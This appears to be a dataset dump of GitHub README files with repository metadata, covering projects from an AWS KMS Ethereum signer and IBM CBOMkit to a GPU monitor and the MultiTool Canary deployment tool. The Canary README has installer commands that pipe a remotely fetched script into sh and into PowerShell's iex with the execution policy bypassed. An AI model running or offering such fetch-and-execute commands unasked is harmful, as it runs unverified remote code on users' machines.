* [EIP-55](https://eips.ethereum.org/EIPS/eip-55) address checksum validation if address has uppercase chars

## Tool chain compatibility

Works with [MUSL](https://musl.libc.org) and [GNU](https://www.gnu.org/software/libc) tool chains.

### Building

I suggest using the provided [`Makefile`](./Makefile) to get things running fast. The default build
target is `x86_64-unknown-linux-gnu`, so this command will build the library with the GNU tool
chain:

```bash
make build
```

If you wish to build it with a different tool chain, it suffices to specify it with the `TOOL_CHAIN`
environment variable, e.g.:

```bash
TOOL_CHAIN=x86_64-unknown-linux-musl make build
```

## Setting up

The library communicates with AWS KMS API endpoints and thus requires authorization. Additionally it
requires AWS region and KMS key ID to be specified in the environment. This is because it was
designed with containers and container orchestration in mind.

There are good chances that you will want to inject some secrets into the client application in
the container orchestration solution (e.g. using
[AWS Secrets Manager](https://aws.amazon.com/secrets-manager/) or
[HashiCorp Vault](https://www.hashicorp.com/products/vault)).

### Key access policy

At the very least the key policy must allow these actions for the IAM role which you are going to
use as the principal (see [documentation](https://docs.rs/evm-signer-kms) for more details):

```test
kms:DescribeKey
kms:GetPublicKey
kms:Sign
kms:Verify
```

### Authorization

I suggest using STS to assume a role which is granted permissions to use the
[secp256k1](https://docs.aws.amazon.com/kms/latest/developerguide/symm-asymm-choose-key-spec.html)
key pair in KMS. Once the IAM role is set up, you can assume it by e.g. setting the following
environment variables:

```bash
export AWS_ACCESS_KEY_ID=""[REDACTED]""
export AWS_SECRET_ACCESS_KEY=""[REDACTED]""
export AWS_SESSION_TOKEN=""[REDACTED]""
```

### Region specification

The region needs to be inferred from the environment, e.g.:

```bash
export AWS_REGION=""[REDACTED]""
```

### KMS key ID

The KMS key which is going to be used for message digests signing can be identified using a key ID
in the UUID format:

```bash
export KMS_KEY_ID=""[REDACTED]""
```

**Note:** The library doesn't understand the `KMS_KEY_ID` variable itself, it is just a suggested
way to pass the key ID to the library logic (see examples in the
[documentation](https://docs.rs/evm-signer-kms)) for more details.

### Testing configuration

The easiest way to check whether everything works the way it should is by running tests.

Before running the tests you need to download the public key PEM file and copy it to
`./tests/data/pub-key.pem` and then decode it to `./tests/data/pub-key.der`.

[`Makefile`](./Makefile) provides a directive for that:

```bash
make fetch-public-key
```

Once the PEM and DER files are there, run the tests with:

```bash
make test
```

**Note**: If you downloaded the PEM file using the management console it is going to have the
following format:

```text
-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----
```

You can use the supplied helper [`pem2der.sh`](./tests/data/scripts/pem2der.sh) shell script:

```bash
cd tests/data
./scripts/pem2der.sh ./pub-key.pem > pub-key.der
```

If the tests pass, you're all set!

## What's needed

* More more and better tests
* Derivation paths support
* ARM `aarch64` support
",3,0,2,MIT,build-and-test.yml,0.0
hamsterbase/Burrow-UI,main,"# Burrow UI

![](home.png)

Burrow UI is an open-source, free launcher designed specifically for E-ink devices. Inspired by the Niagara Launcher, Burrow UI offers a minimalist and efficient interface tailored for E-ink screens.

## Features

- **Open Source and Free**: Burrow UI is completely open-source and free to use, with no hidden costs or in-app purchases.
- **No Ads**: Enjoy a clean, distraction-free experience without any advertisements.
- **Offline Functionality**: Works entirely offline, respecting your privacy and conserving battery life.
- **Ultra-Lightweight**: With an installation package of only 130KB, Burrow UI is incredibly light on system resources.
- **E-ink Optimized**: Designed from the ground up for E-ink displays, ensuring optimal readability and performance.

## Installation

Download the latest release of Burrow UI from the [Releases](https://github.com/hamsterbase/Burrow-UI/releases)

## Support Us

If you find Burrow UI helpful, consider supporting our work:

[Buy us a coffee](https://buymeacoffee.com/hamsterbase)

## Our Other Products

Check out our other innovative products:

- [HamsterBase](https://hamsterbase.com) - A privacy-focused and offline-friendly tool for deferred reading.

## License

Distributed under the GNU General Public License v3.0 (GPL-3.0) License. See `LICENSE` for more information.

## Contact

HamsterBase - admin@hamsterbase.com

Project Link: [https://github.com/hamsterbase/burrow-ui](https://github.com/hamsterbase/burrow-ui)

## Acknowledgements

- Inspired by Niagara Launcher
",2,0,3,GPL-3.0,,4.0
mjovanc/rust-backend-starter,master,"# Rust Backend Starter

A Rust Backend Boilerplate using Actix, SQLite, OpenAPI/Swagger, and more.

This project serves as a starting point for building a robust backend in Rust, featuring key tools and libraries such as Actix for web server functionality, SQLite for database management, and OpenAPI for automatic API documentation.

---

## Features

- **Actix Web**: A powerful and fast web framework for Rust.
- **SQLite**: Lightweight, embedded SQL database for simple data persistence.
- **OpenAPI (Swagger)**: Auto-generate API documentation using Utopia library.
- **JWT Authentication**: Secure user authentication with JSON Web Tokens. NOT DONE.
- **Environment Configuration**: Using `dotenv` for managing environment variables.
- **Serde**: Easy serialization and deserialization of data structures.
- **Logging**: Integrated logging with `env_logger`.
- **CORS**: Cross-Origin Resource Sharing support for secure frontend-backend interactions.
- **DevOps**: Ready for containerization and deployment.

---

## Getting Started

Follow these instructions to set up and run the project on your local machine.

### Prerequisites

- **Rust**: Install [Rust](https://www.rust-lang.org/tools/install) 1.78+
- **SQLite**: Ensure SQLite is installed for local database use.

### Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/mjovanc/rust-backend-starter.git
    cd rust-backend-starter
    ```

2. Install dependencies:

    ```bash
    cargo build
    ```

3. Set up environment variables:

   Create a `.env` file in the root directory and configure your environment variables:

    ```env
    DATABASE_URL=/Users/mjovanc/backend.db
    ```

5. Start the development server:

    ```bash
    cargo run
    ```

The server should now be running at `http://localhost:8080`.

### Build and Run using Docker

This guide will walk you through building and running the backend in a Docker container.

#### Prerequisites

- [Docker](https://www.docker.com/get-started) installed on your machine.

#### Building the Docker Image

1. Open your terminal.
2. Navigate to the directory containing your `Dockerfile`.
3. Run the following command to build your Docker image:

   ```bash
   docker build -t rust_backend_starter .
   docker run -p 8080:8080 -v /path/to/local/sqlite/data:/data rust_backend_starter
   ```",0,0,1,MIT,,0.0
IBM/cbomkit,main,"# CBOMkit - the essentials for CBOMs

[![License](https://img.shields.io/github/license/IBM/cbomkit.svg?)](https://opensource.org/licenses/Apache-2.0) <!--- long-description-skip-begin -->
[![Current Release](https://img.shields.io/github/release/IBM/cbomkit.svg?logo=IBM)](https://github.com/IBM/cbomkit/releases)

CBOMkit is a toolset for dealing with Cryptography Bill of Materials (CBOM). CBOMkit includes a
- **CBOM Generation** ([CBOMkit-hyperion](https://github.com/IBM/sonar-cryptography), [CBOMkit-theia](https://github.com/IBM/cbomkit-theia)): Generate CBOMs from source code by scanning private and public git repositories to find the used cryptography.
- **CBOM Viewer ([CBOMkit-coeus](https://github.com/IBM/cbomkit?tab=readme-ov-file#cbomkit-coeus))**: Visualize a generated or uploaded CBOM and access comprehensive statistics.
- **CBOM Compliance Check**: Evaluate CBOMs created or uploaded against specified compliance policies and receive detailed compliance status reports.
- **CBOM Database**: Collect and store CBOMs into the database and expose this data through a RESTful API.


![CBOMkit Demo](.github/img/cbomkit.gif)

## Quickstart

Starting the CBOMkit using `docker-compose`.
```shell
# clone the repository 
git clone https://github.com/IBM/cbomkit
# run the make command to start the docker compose 
make production
```

Alternatively, if you wish to use podman instead of docker, run the following:
```
# run the make command to start the docker compose using podman
make production ENGINE=podman
```

(This requires podman-compose to have been installed via `pip3 install podman-compose`).

Next steps:
- Enter a git url like [https://github.com/keycloak/keycloak](https://github.com/keycloak/keycloak) to generate a CBOM
- View your generated CBOM by selecting your previously scanned CBOM
- Drag and drop CBOM from the [examples](example) into the dropbox to view it

> [!NOTE]
> By default, the service can be accessed at http://localhost:8001

Deploy using the helm chart to a kubernetes environment. Pass the domain suffix and the cbomkit database creds via helm parameters.
```shell
# clone the repository 
git clone https://github.com/IBM/cbomkit
# deploy using helm
helm install cbomkit \
  --set common.clusterDomain={CLUSTER_DOMAIN} \
  --set postgresql.auth.username={POSTGRES_USER} \
  --set postgresql.auth.password={POSTGRES_PASSWORD} \
  --set backend.tag=$(curl -s https://api.github.com/repos/IBM/cbomkit/releases/latest | grep '""tag_name"":' | sed -E 's/.*""([^""]+)"".*/\1/') \
  --set frontend.tag=$(curl -s https://api.github.com/repos/IBM/cbomkit/releases/latest | grep '""tag_name"":' | sed -E 's/.*""([^""]+)"".*/\1/') \
  ./chart
```

## Architecture

The CBOMkit consists of three integral components: a web frontend, an API server, and a database.

### Frontend and CBOMkit-coeus

The web frontend serves as an intuitive user interface for interacting with the API server. It offers a range of functionalities, including:
 - Browsing the inventory of existing Cryptographic Bills of Materials (CBOMs)
 - Initiating new scans to generate CBOMs 
 - Uploading existing CBOMs for visualization and analysis

#### CBOMkit-coeus

For enhanced flexibility, the frontend component can be deployed as a standalone version, known as the CBOMkit-coeus. 
This option allows for streamlined visualization and compliance analysis independent of the full CBOMkit suite.

```shell
# use this command if you want to run only the CBOMkit-coeus
make coeus
```

### API Server

The API server functions as the central component of the CBOMkit, offering a comprehensive RESTful API 
(see [OpenAPI specification](openapi.yaml)) with the following key features:

#### Features
- Retrieve the most recent generated CBOMs
- Access stored CBOMs from the database
- Perform compliance checks for user-provided CBOMs against specified policies 
- Conduct compliance assessments for stored or generated CBOMs against defined policies

*Sample Query to Retrieve CBOM project identifier*
```shell
curl --request GET \
  --url 'http://localhost:8081/api/v1/cbom/github.com%2Fkeycloak%2Fkeycloak'
```

In addition to the RESTful API, the server incorporates WebSocket integration, enabling:
 - Initiation of CBOM generation through Git repository scanning 
 - Real-time progress updates during the scanning process, transmitted via WebSocket connection

### Compliance

A critical component of the CBOMkit is its compliance checking mechanism for Cryptography Bills of Materials (CBOMs). 
The CBOM structure represents a hierarchical tree of cryptographic assets detected and used by an application. 
This standardized format facilitates the development and implementation of generalized policies 
to identify and flag violations in cryptographic usage.

The CBOMkit currently features a foundational `quantum-safe` compliance check. 
This initial implementation serves as a proof of concept and demonstrates the system's capability to evaluate
cryptographic components against defined policies.

The compliance framework is designed with extensibility in mind, providing a solid platform for:
 - Implementing additional compliance checks 
 - Enhancing existing verification processes 
 - Integrating custom compliance checks (external)

#### Configuration

Different deployment configurations utilize distinct sources for compliance verification.

| Deployment       | How is the compliance check performed?                                                                                                                                                                                                                                                                                                                                                                                               |
|------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `coeus`          | A `quantum-safe` algorithm compliance check is natively implemented within the frontend. This integration allows for immediate, client-side assessment of basic quantum resistance criteria.                                                                                                                                                                                                                                         |
| `production`     | In the standard deployment, a core compliance service is integrated into the backend service. This implementation enables the execution of compliance checks via the RESTful API, providing a scalable and centralized approach to cryptographic policy verification.                                                                                                                                                                |
| `ext-compliance` | In advanced deployment scenarios, compliance evaluation is delegated to a dedicated external service. This service can invoked by the API server as needed. This configuration maintains the standard user experience for both the frontend and API of the CBOMkit, mirroring the functionality of the `production` configuration while allowing for more sophisticated or specialized compliance checks to be performed externally. |

### Scanning and CBOM Generation

The CBOMkit leverages advanced scanning technology to identify cryptographic usage within source code and generate 
Cryptography Bills of Materials (CBOMs). This scanning capability is provided by the 
[CBOMkit-hyperion (Sonar Cryptography Plugin)](https://github.com/IBM/sonar-cryptography), an open-source tool developed by IBM.

#### Supported languages and libraries

The current scanning capabilities of the CBOMkit are defined by the Sonar Cryptography Plugin's supported languages 
and cryptographic libraries:

| Language | Cryptographic Library                                                                         | Coverage | 
|----------|-----------------------------------------------------------------------------------------------|----------|
| Java     | [JCA](https://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html) | 100%     |
|          | [BouncyCastle](https://github.com/bcgit/bc-java) (*light-weight API*)                         | 100%[^1] |
| Python   | [pyca/cryptography](https://cryptography.io/en/latest/)                                       | 100%     |

[^1]: We only cover the BouncyCastle *light-weight API* according to [this specification](https://javadoc.io/static/org.bouncycastle/bctls-jdk14/1.75/specifications.html)

While the CBOMkit's scanning capabilities are currently bound to the Sonar Cryptography Plugin, the modular 
design of this plugin allows for potential expansion to support additional languages and cryptographic libraries in 
future updates.

## Contribution Guidelines

If you'd like to contribute to CBOMkit, please take a look at our
[contribution guidelines](CONTRIBUTING.md). By participating, you are expected to uphold our [code of conduct](CODE_OF_CONDUCT.md).

We use [GitHub issues](https://github.com/IBM/cbomkit/issues) for tracking requests and bugs. For questions
start a discussion using [GitHub Discussions](https://github.com/IBM/cbomkit/discussions).

## License

[Apache License 2.0](LICENSE.txt)
",5,0,10,Apache-2.0,"backend.yml,frontend.yml",30.0
joshlong-attic/2024-bootiful-spring-workshop,main,"
# README 

bit.ly/spring-tips-playlist
youtube.com/@coffeesoftware

## Basics
* which IDE? IntelliJ, VSCode, and Eclipse
* your choice of Java: GraalVM
* start.spring.io, an API, website, and an IDE wizard 
* Devtools
* Docker Compose 
* Testcontainers
* banner.txt

## Development Desk Check
* the Spring JavaFormat Plugin 
	* Python, `gofmt`, your favorite IDE, and 
* the power of environment variables
* SDKMAN
	* `.sdkman`
* direnv 
	*  `.envrc`
* a good password manager for secrets 


## Data Oriented Programming in Java 21+ 
* an example

## Beans
* dependency injection from first principles
* bean configuration
* XML
* stereotype annotations
* lifecycle 
	* BeanPostProcessor
	* BeanFactoryPostProcessor
* auto configuration 
* AOP
* Spring's event publisher
* configuration processor

## AOT & GraalVM
* installing GraalVM 
* GraalVM native images 
* basics
* AOT lifecycles

## Data 
* `JdbcClient`
* SQL Initialization
* Flyway
* Spring Data JDBC

## Batch Processing 
* Spring Batch
* load some data from a CSV file to a SQL database

## Scalability 
* non-blocking IO
* virtual threads
* Jos√© Paumard's demo
* Cora Iberkleid's demo 

## Web Programming
* clients: `RestTemplate`, `RestClient`, declarative interface clients
* REST
	* controllers
	* functional style
* GraphQL 
	* batches


## Architecting for Modularity
* Privacy
* Spring Modulith 
* Externalized messages
* Testing 

## Artificial Intelligence
* what's in a model?
* Spring AI
* `ChatClient`
* prompts
* advisors
* Retrieval Augmented Generation (RAG)

## Microservices
* centralized configuration 
* API gateways 
	* reactive or not reactive
* event bus and refreshable configuration
* service registration and discovery



## Messaging and Integration
* ""What do you mean by Event Driven?""
* Messaging Technologies like RabbitMQ or Apache Kafka
* Spring Integration
* files to events


## Security 
* adding form login to an application
* authentication 
* authorization
* passkeys
* one time tokens
* OAuth 
	* the Spring Authorizatinm Server
	* OAuth clients
	* OAuth resource servers
	* protecting messaging code

## Q&A 
* I may not know, but I probably know who does know...",0,0,1,Apache-2.0,,0.0
LuisaGroup/Efficient-Image-Shape-Splatting,main,"# Efficient Image-Space Shape Splatting for Monte Carlo Rendering
Code for SIGGRAPH Asia 2024 Paper [""Efficient Image-Space Shape Splatting for Monte Carlo Rendering""](https://cs.uwaterloo.ca/~xtong/assets/pdf/shape_splatting.pdf).
![](images/teaser.jpeg)

The code is based on [AkariRender](https://github.com/shiinamiyuki/akari_render). The two main files are:
-  [shape_splat_pt.rs](crates/akari_integrator/src/shape_splat_pt.rs) contains the implementation of the shape splatting integrator on top of path tracing. This integrator is designed to run on GPU and uses the wavefront scheduling proposed in the paper. Running the integrator on CPU is not recommended.
- [shape_splat_mcmc.rs](crates/akari_integrator/src/shape_splat_mcmc.rs) contains the implementation of the shape splatting integrator on top of a unidirectional PSSMLT. It should be run on CPU only.

## Build
If you are using < Windows 10, please upgrade to Windows 10 or above.
- Rust 1.81.0+
- CMake > 3.23
- Ninja
- Clone Blender 4.0 source code from `blender-v4.0-release` branch
- Put path to blender source in `blender_src_path.txt` at project root

To run on CPU, the following runtime requirement must be satisfied:
- clang++ in `PATH`
- llvm dynamic library of the same version (for Windows users, it is the `LLVM-C.dll`.
) should be in `PATH` as well.

## Run
```bash
# Run on GPU
cargo run --release --bin akari-cli -- -s scenes/fireplace-room/scene.json  -m config/pt.json -d cuda
cargo run --release --bin akari-cli -- -s scenes/fireplace-room/scene.json  -m config/shape-splatting-pt.json -d cuda

# Run on CPU
cargo run --release --bin akari-cli -- -s scenes/fireplace-room/scene.json  -m config/pssmlt.json
cargo run --release --bin akari-cli -- -s scenes/fireplace-room/scene.json  -m config/shape-splatting-pssmlt.json
```

",0,0,1,Apache-2.0,,0.0
sionpardosi/Student-Learning-Hub-Aplikasi-Sederhana-Latihan-Belajar-Mahasiswa-Berbasis-JAVA,main,"# Student Learning Hub - App Latihan Belajar Sederhana dengan Tekn. JAVA

### <summary><strong>Tools:</strong></summary>
<p>
    <img src=""https://img.shields.io/badge/Code-Java-blue?&logo=java"" />
    <img src=""https://img.shields.io/badge/Database-JDK-orange?&logo=oracle"" />
    <img src=""https://img.shields.io/badge/Editor-Eclipse-2C2255?&logo=eclipseide"" />
    <img src=""https://img.shields.io/badge/Editor-NetBeans-0071C5?&logo=apache&logoColor=white"" />
    <img src=""https://img.shields.io/badge/Editor-IntelliJ%20IDEA-brightgreen?&logo=intellijidea"" />
</p>

**Student Learning Hub** is a simple Java-based application designed to assist students in their learning exercises and exam management. This application provides access for both lecturers and students to interact through quizzes and online grade management features.

## Overview

*Student Learning Hub* is an innovative application aimed at enhancing the learning experience for students. The application facilitates improved interaction between lecturers and students through various user-friendly features.

## Key Features

- **User Authentication**: 
  - Both lecturers and students can securely register and log into the system.

- **Exam Question Management**: 
  - Lecturers can add, edit, and delete exam questions, allowing students to complete these assignments effectively.

- **Interactive Quizzes**: 
  - Students can take quizzes to test their knowledge and receive immediate feedback on their scores. They can also view the answer keys after completing the quizzes.

- **Grade Reports**: 
  - Students can access their scores from completed quizzes, providing valuable feedback for their learning process.

- **Comment Feature**: 
  - Students can leave comments related to questions and practice results, facilitating constructive two-way communication.

## Purpose

The application aims to assist students in honing their academic skills while providing necessary support for lecturers in the teaching process. With an intuitive interface and easy access, *Student Learning Hub* serves as an effective tool for improving educational quality.

## Table of Contents

- [Introduction](#introduction)
- [Objectives](#objectives)
- [Scope](#scope)
- [Features](#features)
- [Installation](#installation)
- [Requirements](#requirements)
- [Usage](#usage)
- [Project Structure](#project-structure)
- [License](#license)

## Introduction

This document outlines the system requirements for developers and describes how the application works and its usage rules. The application is built for students with the goal of providing access to information and evaluation tools.

## Objectives

The objective of this application is to facilitate lecturers in administering tests and managing exam questions, as well as to assist students in enhancing their skills through the provided exercises.

## Scope

This application encompasses features for both lecturers and students, where lecturers can provide exam questions, and students can take tests. Lecturers can also view student results after examinations.

## Features

### For Lecturers

- Registration and login.
- Question management: add, edit, and delete exam questions.
- View student data and exam results.
- Access comments and feedback from students.

### For Students

- Registration and login.
- Access information related to the application and announcements.
- Complete quizzes and tests assigned by lecturers.
- View results and answer keys after tests.

## Installation

1. Clone this repository:
   ```bash
   git clone https://github.com/username/Student-Learning-Hub.git
",0,0,1,,,0.0
StephenIsTaken/NexusOpen,main,"# NexusOpen
 
A Minecraft 1.21 Fabric Client.

Use JDK 21

To open the source in IDEA, open build.gradle and click ""Load Gradle Project"" and use the ""Run Client"" run configuration.
",0,0,1,GPL-3.0,,0.0
fazil47/wgpu-renderer,master,"# WPGU-Renderer

A rasterizer and raytracer renderer written in Rust using the
[wgpu](https://github.com/gfx-rs/wgpu) library.

![Demo](demo.png)

To run:

```zsh
cargo run --release
```

To run wasm:

```zsh
cargo xtask run-wasm --release
```
",0,0,1,Apache-2.0,,0.0
wack/canary,trunk,"<img align=""center"" width=""1200"" alt=""multitool-canary-github"" src=""https://github.com/user-attachments/assets/5dc758d8-8daf-417d-8542-de7218720ead"">

<h1 align=""center"">MultiTool Canary</h1>
<p align=""center""><b>Your AI-powered, agentic deployment solution for seamless, risk-managed updates</b></p>

<p align=""center"">
üè° <a href=""https://www.multitool.run/"">MultiTool website</a> | üó™ <a href=""https://www.multitool.run/contact"">Contact us</a>

## What is MultiTool Canary?

MultiTool Canary is an agentic deployment tool that quickly detects and rolls back defective deployments. Use the CLI to create and monitor canary deployments, control the amount of traffic they receive, and automatically yank deployments that produce an anomolous number of bad responses. MultiTool Canary improves release confidence by giving you a robust measure of stability, and acting quickly and autonomously when bugs sneak into production.

## Getting Started

This section explains how to deploy an AWS Lambda function to AWS API Gateway using MultiTool Canary. Just point MultiTool Canary to a pre-built Lambda zip, tell it which API Gateway, Stage, and Lambda to deploy to, and it will take care of the rest.

1. First, make sure your AWS credentials are configured:
   ```bash
   $ aws sts get-caller-identity
   ```

   If your credentials aren't set, either login with `aws sso login --profile my-profile` or set your Access Key Id and Secret Access Key:
   ```bash
   $ export AWS_ACCESS_KEY_ID=""${MY_ACCESS_KEY}""
   $ export AWS_SECRET_ACCESS_KEY=""${MY_SECRET_ACCESS_KEY}""
   $ export AWS_REGION=""us-east-2""
   ```

2. Next, tell MultiTool Canary which API Gateway, Stage, and Lambda it should deploy it.
   ```bash
   $ export MULTI_GATEWAY_NAME=""${MY_API_GATEWAY_NAME}""
   $ export MULTI_GATEWAY_STAGE=""${MY_STAGE}""
   $ export MUTLI_LAMBDA_NAME=""${MY_LAMBDA}""
   ```

3. Build your Lambda function. This should be a zipfile with your Lambda's source code. For instance, if you're using `cargo-lambda`:
   ```bash
   $ cargo lambda build -o zip --release
   $ mv ./target/lambda/my-app/bootstrap.zip ./my-release.zip
   ```

4. Finally, run MultiTool Canary, pointing to a pre-built zip:
   ```bash
   $ canary deploy ./my-release.zip
   ```

MultiTool Canary will upload the function to AWS, cut a canary release, and monitor it, progresssingly ramping up traffic as it gains confidence in the deployment. MultiTool Canary scans your CloudWatch metrics to see how your canary application is performing relative to the baseline, and models release confidence based on how they differ. 

## Table of Contents

- [What is MultiTool Canary?](#what-is-multitool-canary-)
- [Getting Started](#getting-started)
- [Table of Contents](#table-of-contents)
- [Installation](#installation)
  * [Building from source](#building-from-source)
- [Architecture support](#architecture-support)
- [Mission](#mission)
- [Contributing](#contributing)

## Installation

Install MultiTool Canary with Homebrew, NPM, Powershell, or via `curl`.

**Installing with Homebrew:**

```sh
brew install wack/tap/canary
```

**Installing with NPM:**

```sh
npm install @multitool/canary@0.1.0-alpha.1
```

**Installing with curl:**

```sh
curl --proto '=https' --tlsv1.2 -LsSf https://github.com/wack/canary/releases/download/v0.1.0-alpha.1/canary-installer.sh | sh
```

**Installing with Powershell:**

```sh
powershell -ExecutionPolicy ByPass -c ""irm https://github.com/wack/canary/releases/download/v0.1.0-alpha.1/canary-installer.ps1 | iex""
```

See [Releases](https://github.com/wack/canary/releases) for pre-built binaries, checksums, and guides to install on additional platforms.

### Building from source

To build MultiTool Canary from source, refer to instructions in [CONTRIBUTING.md](https://github.com/wack/canary/blob/trunk/README.md).

## Features

* Automatic application deployment
* Automated rollback
* Cautious Mode (coming soon) and Optimistic Mode: Choose between preventing false positives and false negatives
* Measure release confidence
* Backward and forward traffic ramping

## Platform Support

Currently, MultiTool Canary only supports deploying canaries for AWS Lambda functions running in AWS API Gateway. However, we are currently working on adding support for additional platforms. Our platform roadmap is presented in the table below.

|                           Platform                           |            Support             |
| :----------------------------------------------------------: | :----------------------------: |
|                 **AWS Lambda + API Gateway**                 |     :sparkles: Available!      |
|                     [Vercel](vercel.com)                     |         :eyes: Up next         |
| [CloudFlare](https://developers.cloudflare.com/workers/configuration/versions-and-deployments/gradual-deployments/#_top) |         :eyes: Up next         |
| [AWS Function Aliases](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-lambda-alias.html) |          :watch: Soon          |
|             [Kubernetes](https://kubernetes.io/)             | :hourglass_flowing_sand: Later |
| [Google Cloud Run Functions](https://cloud.google.com/functions) | :hourglass_flowing_sand: Later |

## Architecture support

MultiTool Canary has official builts for 64-bit Windows, macOS (Apple Silicon and x86), and Linux. No official support is provided for 32-bit architectures, but the CLI is expected to work on 32-bit platforms.

|            | Apple Silicon macOS | Intel macOS | x64 Windows | x64 Linux |
| :--------: | :-----------------: | :---------: | :---------: | :-------: |
|  Homebrew  |          ‚úì          |      ‚úì      |      ‚úì      |     ‚úì     |
|    NPM     |          ‚úì          |      ‚úì      |      ‚úì      |     ‚úì     |
|    Curl    |          ‚úì          |      ‚úì      |      ‚úì      |     ‚úì     |
| Powershell |          ‚úì          |      ‚úì      |      ‚úì      |     ‚úì     |

## Mission 

We're building tools to take agentic deployments mainstream. Right now, operators must synchronously watch deployments go live, or rely on passive metric alerting to identify service disruptions. We want to empower operators to *proactively* identify and rollback disruptive deployments *before* they reach 100% of users with the help of an AI agent. MultiTool Canary is our foundational strategy to introduce agentic deployments to everyone. To learn more about us, visit [our company website](https://www.multitool.run/company).

## Contributing

:rocket: We accept pull requests! :guitar:

See [CONTRIBUTING.md](https://github.com/wack/canary/blob/trunk/CONTRIBUTING.md) for more information.

",1,0,3,MIT,"on-merge.yml,on-pr.yml,push.yml,release.yml",44.0
ulissesf/qmassa,main,"# qmassa!

<div align=""center"">

[![Crate Badge]][Crate]

</div>

![qmassa](https://github.com/ulissesf/qmassa/blob/assets/assets/qmassa-v0.3.0.gif?raw=true)

## General description

qmassa is a Rust terminal-based tool for displaying GPUs usage stats on Linux.
It aims to display as much device and DRM clients (processes using the
GPU) information as possible. Command-line options and which user is running
the tool control how much can be displayed.

Most of the information is gathered through a GPU vendor and driver agnostic
interface such as standard files in /proc and /sys or by using udev. For some
of the stats, though, a driver-specific way is needed, and qmassa then
leverages what the kernel drivers expose in their uAPI (e.g. specific query
ioctls), specific sysfs files/directories or through perf events.

## How to install it

The recommendation is to install qmassa using cargo. If you want to install
the latest release on crates.io and using qmassa's lock file:

```shell
cargo install --locked qmassa
```

If you want to install the latest development version using qmassa's lock file:

```shell
cargo install --locked --git https://github.com/ulissesf/qmassa
```

## How to use it

> [!IMPORTANT]
> If you want to run qmassa as a non-root user, it needs to be added to at
> least the video, render, and power groups (or equivalent ones in your Linux
> distribution). That is needed so qmassa can open the DRM device nodes to
> collect information from ioctls. If your user is not in the right groups
> you'll likely get ""Permission denied"" errors.

Running it as non-root user and wihout any command-line options will display
limited device usage information and the DRM clients stats from processes that
user has access to in /proc.

```shell
qmassa
```

Running it as the root user and wihout any commnad-line options will display
all the device avaiable stats along with all active DRM clients in the system.

```shell
sudo qmassa
```

Only show a specific GPU device and DRM clients using it. The GPU device
is specified by its PCI device slot name.

```shell
sudo qmassa -d 0000:03:00.0
```

Only show DRM clients from the process tree starting at a specific PID.

```shell
sudo qmassa -p 2876
```

Running for only 5 iterations (UI updates).

```shell
sudo qmassa -n 5
```

Changing the interval between updates to 1s (1000 ms).

```shell
sudo qmassa -m 1000
```

Showing all DRM clients including the inactive ones (no memory allocated or
engines being used).

```shell
sudo qmassa -a
```

Saving the stats to a JSON file.

```shell
sudo qmassa -t data.json
```

## Fields description

### Per device

| Field        | Description                                    |
| ------------ | ---------------------------------------------- |
| DRIVER       | Kernel driver being used                       |
| TYPE         | Integrated, Discrete or Unknown                |
| DEVICE NODES | Character device nodes in /dev/dri             |
| SMEM         | System memory used / Total system memory       |
| VRAM         | Device memory used / Total device memory       |
| [Engines]    | Overall engine usage in the last iteration     |
| POWER        | GPU power usage / Package power usage          |

The memory usage values are either in bytes (no letter), or in KiB
(using ""K"" letter), or in MiB (using ""M"" letter), or in GiB (using ""G""
letter). The values are rounded to be easily displayed in a small space,
but if you save the stats to a JSON file you can get them all in bytes.

The overall engines usage depends on the DRM clients that the user has
access to. In order to have a system view, please run qmassa as root.

The intention of the power reporting is to have values that are the
closest possible to the power usage from both the GPU and the larger package
(or card) containing it. It's good to remember that larger package is
different on integrated vs discrete GPUs, and there are limitations on what
drivers expose and what they have visibility on so expect the information
to vary a lot across GPUs and vendors. All the power usage values are in
watts (W).

The frequency graph ranges from min to max values and plots the instant
driver-requested (if supported) and actual device frequency for each
iteration. The graph legend shows the latest value for those frequencies.
The graph also indicates the overall status and PL1 throttle reason (for
now only valiid on i915 and Xe drivers). All the frequency values are in
MHz.

#### Driver support

The table below shows the current drivers and features supported in qmassa
to get device information.

| Driver | Dev Type | Mem Info | Engines | Freqs   | Power   | Client Mem Info |
| ------ | :------: | :------: | :-----: | :-----: | :-----: | :-------------: |
| xe     | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: |
| i915   | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: |
| amdgpu | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: (only dGPUs) | :white_check_mark: (Linux kernel 6.12+) |

qmassa is tested on some Intel and AMD GPUs but it relies heavily on kernel
drivers exposing consistent support across GPUs. If you have a problem,
please file an issue so we can debug it.

#### Limitations

* i915: the kernel driver doesn't track/report system memory used and thus
qmassa can't display it.

### Per DRM client

| Field        | Description                                       |
| ------------ | ------------------------------------------------- |
| PID          | Process ID                                        |
| SMEM         | Resident amount of system memory                  |
| VRAM         | Resident amount of device memory                  |
| MIN          | Minor number of /dev/dri device node being used   |
| [Engines]    | Engine usage in the last iteration                |
| CPU          | Process' overall CPUs usage in the last iteration |
| COMMAND      | [/proc/PID/comm] /proc/PID/cmdline                |

The memory usage for DRM clients follow the same format and units as
described in the previous per device section. All the values can also
be found in bytes when stats are saved to a JSON file.

The engines reported are driver and vendor specific, and are read directly
from DRM fdinfo files in /proc.

The CPU usage is measured by how much CPU time that process used versus the
total available CPU time across all online CPUs in the system for that
iteration. The total available CPU time is the time between two samples
multiplied by the number of online CPUs. This allows this value to stay
between 0% and 100%.

## Acknowledgements

qmassa uses <a href=""https://ratatui.rs/"">Ratatui</a> for displaying a nice
terminal-based UI and leverages [many](Cargo.toml) other Rust crates.

## License

Copyright ¬© 2024 Ulisses Furquim

This project is distributed under the terms of the Apache License (Version 2.0).
See [LICENSE](LICENSE) for details.


[Crate Badge]: https://img.shields.io/crates/v/qmassa?logo=rust&style=flat-square&logoColor=E05D44&color=E05D44
[Crate]: https://crates.io/crates/qmassa
",0,0,4,Apache-2.0,,2.0
msminhas93/nviwatch,master,"- [NviWatch](#nviwatch)
  - [Demo](#demo)
  - [Benchmarks](#benchmarks)
    - [Benchmark Results](#benchmark-results)
